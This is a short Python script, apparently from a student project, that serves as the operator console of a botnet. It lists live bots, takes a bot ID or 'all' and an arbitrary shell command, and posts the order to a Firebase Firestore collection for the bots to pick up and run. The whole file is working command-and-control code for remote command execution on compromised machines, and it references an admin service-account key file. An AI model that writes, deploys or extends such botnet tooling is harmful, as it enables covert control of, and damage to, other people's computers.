import os
import firebase_admin
from firebase_admin import credentials, firestore# initialize sdk
from datetime import datetime

cred = credentials.Certificate("tfg-nicolas-cea-firebase-adminsdk-bq588-0a7759e31d.json")

firebase_admin.initialize_app(cred)# initialize firestore instance

firestore_db = firestore.client()# add data

now = datetime.now()
dt_string = now.strftime("%d-%m-%Y %H:%M:%S")

# Escribe una orden para la botnet
os.system("python3 botsVivos.py")

botEscogido = input("Select a bot or leave empty to set a permanent order: ")
if(botEscogido == ""):
    botEscogido = 'todos'

ejecucion = input("Write a command to execute on the target: ")

firestore_db.collection(u'ordenes').document('comando ' + dt_string).set({'Primitiva': 'COMANDO', 'Bot_ID': botEscogido, 'comando': ejecucion})
